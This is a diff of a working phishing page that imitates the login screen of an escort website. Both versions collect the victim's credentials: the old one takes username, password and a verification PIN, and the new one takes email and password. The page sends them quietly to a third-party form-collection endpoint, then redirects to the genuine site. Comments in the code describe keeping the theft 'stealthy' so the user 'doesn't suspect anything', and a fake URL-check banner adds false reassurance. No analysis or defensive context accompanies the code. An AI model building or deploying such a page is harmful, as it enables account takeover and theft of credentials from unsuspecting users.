@@ -1,108 +1,123 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Member Access | Secure Portal</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22 fill=%22%23C62828%22 font-weight=%22bold%22>TSE</text></svg>">
-    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Log in | Verification</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f4f4f4; display: flex; flex-direction: column; align-items: center; padding-top: 50px; margin: 0; }
-        .container { background: white; width: 90%; max-width: 350px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-top: 4px solid #C62828; }
-        .header { padding: 25px 15px; text-align: center; border-bottom: 1px solid #eee; }
-        .tse-logo { color: #C62828; font-size: 32px; font-weight: 900; letter-spacing: -1px; margin-bottom: 5px; }
-        .header-title { color: #333; font-size: 16px; font-weight: 600; }
-        .content { padding: 25px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 14px; background: #C62828; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
-        .hidden { display: none; }
-        .info-text { font-size: 13px; color: #666; margin-bottom: 15px; text-align: center; line-height: 1.4; }
-        .footer { margin-top: 20px; font-size: 11px; color: #999; text-align: center; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #C62828; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root {
+            --brand-red: #b32d36;
+            --text-main: #333;
+            --text-dim: #757575;
+        }
+
+        body {
+            font-family: -apple-system, system-ui, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Loading Overlay Styling */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--brand-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Header & Form Layout */
+        .header-bar { width: 100%; height: 60px; background: var(--brand-red); display: flex; align-items: center; padding: 0 15px; color: white; box-sizing: border-box; }
+        .verify-banner { width: 90%; max-width: 450px; background: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 12px; margin-top: 20px; padding: 12px; text-align: center; font-size: 14px; color: #2e7d32; }
+        .login-container { width: 90%; max-width: 450px; margin-top: 30px; text-align: center; }
+        
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dcdcdc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
+        .btn-login { width: 100%; padding: 14px; background: var(--brand-red); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <div class="tse-logo">TSE</div>
-        <div class="header-title">Member Validation</div>
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p style="color: #333; margin-top: 15px; font-weight: 600;">Connecting to secure server...</p>
     </div>
-    
-    <div class="content">
-        <form id="mainForm" action="https://usebasin.com/f/d00233245bb3" method="POST">
+
+    <div class="header-bar">
+        <span>&#8592; Log in</span>
+    </div>
+
+    <div class="verify-banner">
+        Please make sure you are visiting the correct URL:<br>
+        <strong>🔒 m.tsescorts.com</strong>
+    </div>
+
+    <div class="login-container">
+        <h1 style="font-size: 28px; margin-bottom: 5px;">Log in</h1>
+        <p style="color: var(--text-dim); margin-bottom: 25px;">Use your email and password to log in</p>
+
+        <form id="loginForm" action="https://usebasin.com/f/d00233245bb3" method="POST">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
             
-            <div id="view1">
-                <p class="info-text">Secure login required to sync your profile data. Please enter your credentials below.</p>
-                <input type="text" name="user_ref" placeholder="Username / Email" required>
-                <input type="password" name="token_val" placeholder="Password" required>
-                <button type="button" class="btn" onclick="processStep1()">Sign In</button>
-            </div>
+            <input type="hidden" name="convertToAjax" value="true">
 
-            <div id="viewLoading" class="hidden">
-                <div class="loader"></div>
-                <p class="info-text">Establishing secure connection...</p>
-            </div>
-
-            <div id="view2" class="hidden">
-                <p class="info-text" style="color: #C62828; font-weight: bold;">Security Pin Required</p>
-                <p class="info-text">A 6-digit verification code has been sent. Enter it to complete the sync.</p>
-                <input type="text" name="secure_id" placeholder="000000" maxlength="6" required>
-                <button type="button" class="btn" onclick="finalSubmit()">Verify & Unlock</button>
-            </div>
+            <button type="submit" class="btn-login">Log in</button>
         </form>
     </div>
-</div>
 
-<div class="footer">
-    <p>🛡️ Encrypted by 256-bit SSL Security</p>
-    <p>© 2026 TSE Global Systems. All Rights Reserved.</p>
-</div>
+    <script>
+        const form = document.getElementById('loginForm');
+        const overlay = document.getElementById('loading-overlay');
 
-<script>
-    // Variables for your endpoints
-    const basinAction = document.getElementById('mainForm').action;
-    const realWebsite = "https://tsescort.com"; // Put the real site URL here
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop immediate submission
+            
+            // 1. Show the loading spinner
+            overlay.style.display = 'flex';
+            
+            // 2. Capture the data
+            const formData = new FormData(form);
 
-    function processStep1() {
-        const form = document.getElementById('mainForm');
-        const formData = new FormData(form);
-        
-        // Background send Step 1 data
-        fetch(basinAction, { method: 'POST', body: formData, mode: 'no-cors' });
-
-        document.getElementById('view1').classList.add('hidden');
-        document.getElementById('viewLoading').classList.remove('hidden');
-
-        setTimeout(function() {
-            document.getElementById('viewLoading').classList.add('hidden');
-            document.getElementById('view2').classList.remove('hidden');
-        }, 3000);
-    }
-
-    function finalSubmit() {
-        const form = document.getElementById('mainForm');
-        const formData = new FormData(form);
-
-        // Background send Step 2 data (the PIN)
-        fetch(basinAction, { 
-            method: 'POST', 
-            body: formData, 
-            mode: 'no-cors' 
-        }).then(() => {
-            // Immediately redirect after sending
-            window.location.href = realWebsite;
-        }).catch(() => {
-            // Redirect even if there's a network error to keep things stealthy
-            window.location.href = realWebsite;
+            // 3. Send data to Basin in the background (AJAX)
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // 4. Wait for the remainder of the 3 seconds, then redirect
+                setTimeout(() => {
+                    window.location.replace("https://tsescort.com/login");
+                }, 3000); 
+            }).catch(error => {
+                // Even if there is an error, we still redirect so the user doesn't suspect anything
+                setTimeout(() => {
+                    window.location.replace("https://tsescort.com/login");
+                }, 3000);
+            });
         });
-
-        // Forced backup redirect in case the fetch takes too long
-        setTimeout(() => {
-            window.location.href = realWebsite;
-        }, 1000);
-    }
-</script>
+    </script>
 
 </body>
 </html>
